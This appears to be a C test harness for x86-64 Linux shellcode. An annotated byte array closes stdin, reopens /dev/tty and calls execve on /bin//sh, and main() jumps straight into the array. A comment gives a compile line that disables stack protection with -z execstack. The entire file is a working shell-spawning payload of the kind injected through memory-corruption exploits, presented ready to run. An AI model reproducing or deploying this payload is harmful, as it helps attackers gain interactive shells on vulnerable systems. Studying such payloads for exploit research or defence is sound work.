#include <stdio.h>
#include <string.h>

/**
 * clang -z execstack -o shellcode_test shellcode_test.c
 * ./shellcode_test
 */
char shellcode[] =
    // close(0)
    "\x48\x31\xff"                                // xor    %rdi,%rdi
    "\x48\x31\xc0"                                // xor    %rax,%rax
    "\xb0\x03"                                    // mov    $0x3,%al
    "\x0f\x05"                                    // syscall
    // open("/dev/tty", 0, 0, 0)
    "\x48\x31\xc0"                                // xor    %rax,%rax
    "\x50"                                        // push   %rax
    "\x48\xbb\x2f\x64\x65\x76\x2f"                // movabs $0x7974742f7665642f,%rbx
    "\x74\x74\x79"                                //
    "\x53"                                        // push   %rbx
    "\x48\x89\xe6"                                // mov    %rsp,%rsi
    "\x48\x31\xd2"                                // xor    %rdx,%rdx
    "\x48\x31\xff"                                // xor    %rdi,%rdi
    "\x4d\x31\xd2"                                // xor    %r10,%r10
    "\xb0\xff"                                    // mov    $0xff,%al
    "\x48\xff\xc0"                                // inc    %rax
    "\x48\xff\xc0"                                // inc    %rax
    "\x0f\x05"                                    // syscall
    // execve
    "\x48\x31\xd2"                                // xor    %rdx,%rdx
    "\x48\x31\xc0"                                // xor    %rax,%rax
    "\x50"                                        // push   %rax
    "\x48\xbb\x2f\x62\x69\x6e\x2f"                // movabs $0x68732f2f6e69622f,%rbx
    "\x2f\x73\x68"                                //
    "\x53"                                        // push   %rbx
    "\x48\x89\xe7"                                // mov    %rsp,%rdi
    "\x52"                                        // push   %rdx
    "\x57"                                        // push   %rdi
    "\x48\x89\xe6"                                // mov    %rsp,%rsi
    "\xb0\x3b"                                    // mov    $0x3b,%al
    "\x0f\x05";                                   // syscall

int main()
{
  printf("len:%lu bytes\n", strlen(shellcode));
  (*(void(*)()) shellcode)();
  return 0;
}